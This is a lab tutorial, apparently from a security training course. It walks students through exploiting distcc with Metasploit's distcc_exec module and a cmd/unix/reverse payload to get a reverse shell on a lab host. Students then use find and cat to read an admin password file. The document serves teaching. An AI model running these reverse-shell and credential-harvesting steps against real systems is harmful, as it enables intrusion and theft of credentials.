# Privilege Escalation Demo

**Note**: Ensure that you do not miss running any of the commands mentioned in the steps below. If you fail to run any of the commands, the lab validation may fail.

We will first set up a low-privileged shell using Metasploit, which you will then use for post-exploitation and privilege-escalation techniques.

1.  Open the Hyper-V Manager in your **LabVM** and right click on **Kali virtual machine** then click on **Connect** to connect to your **Kali virtual machine**.

    ![](./images/selecthyperv.png)

    ![](./images/kali.png)

    login to the Kali VM using username **root** and password **kali**.

2. On the Desktop of Kali VM, right click and choose **Open Terminal here**.

    ![](./images/terminal.png)

3. In the terminal enter **msfconsole** to launch msfconsole.

    ![](./images/msfconsole.png)

4. search for **distcc** using command **search distcc**.

    ![](./images/searchdistcc.png)

5. select the module using command **use exploit/unix/misc/distcc_exec**.

    ![](./images/use.png)

6. set the remote host using command **set RHOSTS 172.22.117.150**.

    ![](./images/Rhosts-1.png)

7. Before running the module, we need to set a payload. List the available payloads using command **show payloads**.

    ![](./images/showpay.png)

8. Select the reverse payload. Be sure NOT to select reverse_bash, or the exploit will not work using command **set PAYLOAD cmd/unix/reverse**.

    ![](./images/reverse.png)

9. Host that listens for the payload communication. In this case, our LHOST is the machine that we're currently operating on. 

    Run command **set LHOST 172.22.117.100**

    ![](./images/lhost.png)

10. Run the module.

    ![](./images/exploit1.png)

11. Use the `find` command (`find / -type f -iname "*admin*.txt"`), as the following image shows:

    ![](./images/find.png)

12. Run the commnd **cat /var/tmp/adminpassword.txt** to get the admin username and password.

    ![](./images/cat.png)

13. click on **ctrl + c** and then enter command **exit** from msfconsole.

    ![](./images/exit.png)
